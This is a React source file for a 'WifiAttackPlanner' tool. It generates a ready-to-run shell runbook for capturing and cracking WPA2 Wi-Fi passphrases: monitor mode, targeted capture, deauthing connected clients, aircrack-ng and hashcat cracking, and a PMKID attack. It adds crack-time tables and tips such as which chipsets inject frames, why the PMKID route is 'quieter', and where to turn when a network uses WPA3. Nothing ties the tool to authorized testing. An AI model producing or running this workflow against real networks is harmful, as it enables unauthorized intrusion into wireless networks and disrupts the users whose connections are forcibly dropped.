import { useMemo, useState } from 'react';
import { Callout, Card, KVTable, NumberInput, OutputBlock, Select, TextInput } from '@/components/ui';

const CHARSETS = [
  { value: 'digits', label: 'Digits (10)', size: 10 },
  { value: 'lower', label: 'Lowercase (26)', size: 26 },
  { value: 'lowerdigit', label: 'Lowercase + digits (36)', size: 36 },
  { value: 'mixed', label: 'Mixed case + digits (62)', size: 62 },
  { value: 'printable', label: 'Full printable ASCII (95)', size: 95 },
];

const SECONDS_PER_YEAR = 31557600;

function fmtDuration(sec: number): string {
  if (!Number.isFinite(sec)) return 'beyond the heat death of the hardware';
  if (sec < 1) return 'under a second';
  if (sec < 60) return `${sec.toFixed(1)} s`;
  if (sec < 3600) return `${(sec / 60).toFixed(1)} min`;
  if (sec < 86400) return `${(sec / 3600).toFixed(1)} h`;
  if (sec < SECONDS_PER_YEAR) return `${(sec / 86400).toFixed(1)} days`;
  const years = sec / SECONDS_PER_YEAR;
  return years > 1e6 ? `${years.toExponential(2)} years` : `${years.toFixed(1)} years`;
}

function fmtCount(n: number): string {
  if (!Number.isFinite(n)) return '—';
  if (n >= 1e15) return n.toExponential(2);
  return Math.round(n).toLocaleString('en-GB');
}

export default function WifiAttackPlanner() {
  const [iface, setIface] = useState('wlan0');
  const [bssid, setBssid] = useState('AA:BB:CC:DD:EE:FF');
  const [channel, setChannel] = useState(6);
  const [capFile, setCapFile] = useState('capture-01.cap');
  const [wordlist, setWordlist] = useState('/usr/share/wordlists/rockyou.txt');
  const [charset, setCharset] = useState('lowerdigit');
  const [length, setLength] = useState(8);
  const [rate, setRate] = useState(250000);

  const mon = `${iface.trim() || 'wlan0'}mon`;
  const cap = (capFile.trim() || 'capture-01.cap').replace(/\.pcapng?$/i, '');
  const rateSafe = Math.max(1, rate);
  const space = CHARSETS.find((c) => c.value === charset) ?? CHARSETS[2];

  const runbook = useMemo(
    () =>
      [
        '# 0 — free the radio and enter monitor mode',
        'sudo airmon-ng check kill',
        `sudo airmon-ng start ${iface.trim() || 'wlan0'}`,
        `# expect a new interface called ${mon}; confirm with: iw dev`,
        '',
        '# 1 — reconnaissance: find the AP and its channel',
        `sudo airodump-ng ${mon}`,
        '',
        '# 2 — targeted capture, locked to the BSSID and channel',
        `sudo airodump-ng -c ${channel} --bssid ${bssid} -w ${cap} ${mon}`,
        '',
        '# 3 — force a handshake (second terminal; deauth a connected client)',
        `sudo aireplay-ng --deauth 5 -a ${bssid} ${mon}`,
        '',
        '# 4a — crack the four-way handshake with a wordlist',
        `aircrack-ng -w ${wordlist} -b ${bssid} ${cap}-01.cap`,
        '',
        '# 4b — or convert for hashcat (mode 22000)',
        `hcxpcapngtool -o hash.hc22000 ${cap}-01.cap`,
        `hashcat -m 22000 hash.hc22000 ${wordlist}`,
        '',
        '# 5 — PMKID route: no client, no deauth, no handshake',
        `sudo hcxdumptool -i ${mon} -o pmkid.pcapng --enable_status=1`,
        'hcxpcapngtool -o hash.hc22000 pmkid.pcapng',
        `hashcat -m 22000 hash.hc22000 ${wordlist}`,
      ].join('\n'),
    [iface, mon, channel, bssid, cap, wordlist],
  );

  const rows = useMemo(
    () =>
      [8, 9, 10, 11, 12].map((len) => {
        const keyspace = Math.pow(space.size, len);
        return {
          len,
          keyspace,
          time: keyspace / rateSafe,
        };
      }),
    [space.size, rateSafe],
  );

  const current = Math.pow(space.size, Math.max(1, length));
  const currentTime = current / rateSafe;
  const perSecond = rateSafe;

  return (
    <>
      <Card title="Target and wordlist">
        <div className="grid gap-3 sm:grid-cols-2">
          <TextInput label="Wireless interface" value={iface} onChange={setIface} mono hint="The managed interface before monitor mode" />
          <TextInput label="BSSID" value={bssid} onChange={setBssid} mono hint="AP MAC address, colon separated" />
          <NumberInput label="Channel" value={channel} onChange={setChannel} min={1} max={196} hint="Locked during capture; 5 GHz uses 36–165" />
          <TextInput label="Capture file" value={capFile} onChange={setCapFile} mono hint="airodump-ng appends -01, -02 per file rotation" />
          <TextInput label="Wordlist" value={wordlist} onChange={setWordlist} mono className="sm:col-span-2" />
        </div>
        <div className="mt-3">
          <Callout tone="info" title="Card and driver reality check">
            Monitor mode and frame injection need a chipset whose driver supports it (Atheros AR9271, RTL8812AU, MT7612U).
            Onboard Intel cards will put the interface up but silently drop injected deauth frames, which is the usual
            reason a capture never fills.
          </Callout>
        </div>
      </Card>

      <Card title="Capture and crack runbook">
        <OutputBlock value={runbook} label="wifi-runbook.sh" rows={20} />
        <p className="mt-2 mb-0 text-[11.5px] text-[var(--text-faint)]">
          A handshake needs at least one client associated to the AP. The PMKID route in step 5 works against the AP alone —
          try it first, it is quieter and faster than waiting for a deauth to land.
        </p>
      </Card>

      <Card title="Crack-time estimate">
        <div className="grid gap-3 sm:grid-cols-3">
          <Select label="Passphrase space" value={charset} onChange={setCharset} options={CHARSETS.map((c) => ({ value: c.value, label: c.label }))} />
          <NumberInput label="Length" value={length} onChange={setLength} min={8} max={16} hint="WPA2 minimum is 8 characters" />
          <NumberInput label="Hash rate (H/s)" value={rate} onChange={setRate} min={1000} max={100000000} step={10000} hint="One modern GPU: ~250 kH/s for mode 22000" />
        </div>
        <div className="mt-3">
          <KVTable
            rows={[
              ['Keyspace', `${fmtCount(current)} candidates (${space.size}^${Math.max(1, length)})`],
              ['Time at this rate', fmtDuration(currentTime)],
              ['Expected half-space search', fmtDuration(currentTime / 2)],
              ['Rate used', `${fmtCount(perSecond)} H/s — PBKDF2-HMAC-SHA1, 4096 iterations per candidate`],
            ]}
          />
        </div>
        <div className="mt-3 overflow-x-auto rounded border border-[var(--card-border)]">
          <table className="w-full border-collapse text-[12px]">
            <thead>
              <tr className="text-left text-[10.5px] tracking-wide text-[var(--text-faint)] uppercase">
                <th className="px-2.5 py-1.5 font-medium">Length</th>
                <th className="px-2.5 py-1.5 font-medium">Keyspace</th>
                <th className="px-2.5 py-1.5 font-medium">Seconds</th>
                <th className="px-2.5 py-1.5 font-medium">Minutes</th>
                <th className="px-2.5 py-1.5 font-medium">Hours</th>
                <th className="px-2.5 py-1.5 font-medium">Days</th>
                <th className="px-2.5 py-1.5 font-medium">Readable</th>
              </tr>
            </thead>
            <tbody>
              {rows.map((r, i) => (
                <tr key={r.len} className={i % 2 ? 'bg-[var(--neutral-btn)]' : ''}>
                  <td className="rf-mono px-2.5 py-1.5 text-[var(--text)]">{r.len}</td>
                  <td className="rf-mono px-2.5 py-1.5 text-[11px] text-[var(--text-muted)]">{fmtCount(r.keyspace)}</td>
                  <td className="rf-mono px-2.5 py-1.5 text-[11px] text-[var(--text-muted)]">{fmtCount(r.time)}</td>
                  <td className="rf-mono px-2.5 py-1.5 text-[11px] text-[var(--text-muted)]">{fmtCount(r.time / 60)}</td>
                  <td className="rf-mono px-2.5 py-1.5 text-[11px] text-[var(--text-muted)]">{fmtCount(r.time / 3600)}</td>
                  <td className="rf-mono px-2.5 py-1.5 text-[11px] text-[var(--text-muted)]">{fmtCount(r.time / 86400)}</td>
                  <td className="px-2.5 py-1.5 text-[11px] text-[var(--text)]">{fmtDuration(r.time)}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
        <p className="mt-2 mb-0 text-[11.5px] text-[var(--text-faint)]">
          Each WPA2 candidate costs 4096 SHA-1 iterations, which is why a GPU manages hundreds of thousands per second
          while an MD5 crack of the same size chews through billions. Rule-of-thumb lists target 8–10 characters for a
          reason: past eleven, a dictionary or mask attack beats brute force by orders of magnitude.
        </p>
      </Card>

      <Card title="Why WPA3 changes the plan">
        <Callout tone="warn" title="SAE is not WPA2 with a new badge">
          WPA3-Personal replaces the four-way handshake PSK with SAE (Dragonfly). There is no PMKID to harvest and no
          offline handshake to convert — a captured SAE exchange yields nothing to <span className="rf-mono">hashcat -m 22000</span>{' '}
          because the password never verifies against the captured transcript offline. Cracking becomes an online,
          rate-limited guessing game against the AP, which either locks out or drops you.
        </Callout>
        <div className="mt-3">
          <KVTable
            rows={[
              ['WPA2-PSK', 'Captured handshake or PMKID → fully offline dictionary and mask attack.'],
              ['WPA3-SAE', 'No offline verifier; each guess is an online commit/exchange round.'],
              ['WPA3 transition mode', 'The AP still offers WPA2 for legacy clients — that BSS is attackable as WPA2.'],
              ['WPA2 Enterprise', 'No PSK at all: capture a client certificate or attack the RADIUS identity instead.'],
            ]}
          />
        </div>
        <p className="mt-3 mb-0 text-[11.5px] text-[var(--text-faint)]">
          Practical consequence: fingerprint the AKM suite from the beacon (<span className="rf-mono">airodump-ng</span> shows
          WPA3 or SAE in the privacy column, <span className="rf-mono">wash -j</span> prints it directly). If SAE is the only
          suite, stop planning a capture run and look at transition mode, rogue-AP, or client-side avenues instead.
        </p>
      </Card>
    </>
  );
}
